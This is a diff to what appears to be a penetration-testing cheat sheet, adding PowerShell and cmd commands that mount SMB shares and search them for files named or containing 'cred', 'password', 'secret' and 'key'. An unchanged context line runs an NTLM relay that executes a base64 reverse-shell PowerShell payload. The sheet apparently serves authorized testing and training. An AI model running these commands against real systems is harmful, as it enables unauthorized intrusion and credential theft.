@@ -270,7 +270,10 @@ $ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address>
 $ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address> -c 'powershell -e <base64 reverse shell>
 C:\> net use n: \\<IP address>\<share name>
 C:\> net use n: \\<IP address>\<share name> /user:<username> <password>
+PS C:\> New-PSDrive -Name "N" -Root "\\<IP address>\<share name>" -PSProvider "FileSystem"
+PS C:\> New-PSDrive -Name "N" -Root "\\<IP address>\<share name>" -PSProvider "FileSystem" -Credential (New-Object System.Management.Automation.PSCredential("<username>",(ConvertTo-SecureString "<password>" -AsPlainText -Force)))
 C:\> dir n: /a-d /s /b | find /c ":\"
+PS:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
 ```
 
 - IMAP (port 143)
@@ -1340,16 +1343,38 @@ Memory and cache
 Keyrings e.g. browser stored credentials
 ```
 
+- Dir
+
+```
+C:\> dir n:\*cred* /s /b
+C:\> dir n:\*password* /s /b
+C:\> dir n:\*users* /s /b
+C:\> dir n:\*secret* /s /b
+C:\> dir n:\*key* /s /b
+```
+
 - Findstr
 
 ```
-C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml	
+C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+C:\> findstr /s /i cred n:\*.*
 ```
 
 - Get-ChildItem
 
 ```
 PS C:\> Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern "pass"
+PS C:\> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
+PS C:\> Get-ChildItem -Recurse -Path N:\ -Include *password* -File
+PS C:\> Get-ChildItem -Recurse -Path N:\ -Include *users* -File
+PS C:\> Get-ChildItem -Recurse -Path N:\ -Include *secret* -File
+PS C:\> Get-ChildItem -Recurse -Path N:\ -Include *key* -File
+```
+
+- Select-String
+
+```
+PS C:\> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
 ```
 
 - Rundll32
